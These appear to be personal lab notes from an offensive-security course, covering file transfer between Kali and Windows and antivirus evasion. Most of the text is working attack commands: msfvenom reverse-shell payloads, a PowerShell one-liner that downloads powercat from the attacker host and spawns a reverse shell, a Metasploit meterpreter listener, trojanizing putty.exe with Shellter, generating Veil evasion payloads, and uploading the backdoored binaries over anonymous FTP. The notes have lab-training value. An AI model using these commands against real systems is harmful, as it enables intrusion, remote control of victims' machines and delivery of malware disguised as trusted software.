copy file from windows to kali - set up smb server
on kali
```
mkdir smb
impacket-smbserver -smb2support smb smb
```

from windows - cmd
```
net use \\192.168.45.194\smb
copy \Users\offsec\Desktop\malware.exe \\192.168.45.194\smb
copy \\192.168.45.194\smb\binary.exe \Users\offsec\Desktop\binary.exe
```

Another way from windows powershell
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.194/SpotifySetup.exe', 'SpotifySetup.exe')

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.194 LPORT=443 -f exe > binary.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.194 LPORT=443 -f powershell -v sc

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.194/powercat.ps1');powercat -c 192.168.45.194 -p 443 -e cmd"

xfreerdp -u offsec -p lab 192.168.187.62:3389

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.194;set LPORT 443;run;"
```

### VM 1

download putty.exe 32 bit
```
shellter
/home/kali/Downloads/putty.exe
```

follow prompts and select metrepeter reverse shell

set up listener
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.194;set LPORT 443;run;"
```

upload using FTP
```
ftp binary -u ftp://anonymous@192.168.187.53/putty.exe /home/kali/Downloads/putty.exe
```

did it get uploaded?
```
curl ftp://anonymous@192.168.187.53
```

use ftp console
```
ftp anonymous@192.168.187.53
> binary
> passive (turn it off)
> put /home/kali/Downloads/putty.exe putty.exe
```
### VM 2
fix veil install issue https://github.com/Veil-Framework/Veil/issues/428
```
cd /usr/share/veil
./Veil.py -t Evasion  -p=22 --ip 196.168.45.194 --port 443 --compiler py2exe
# output written to /var/lib/veil/output/source/payload.bat
> put /var/lib/veil/output/source/payload1.bat payload1.bat
```



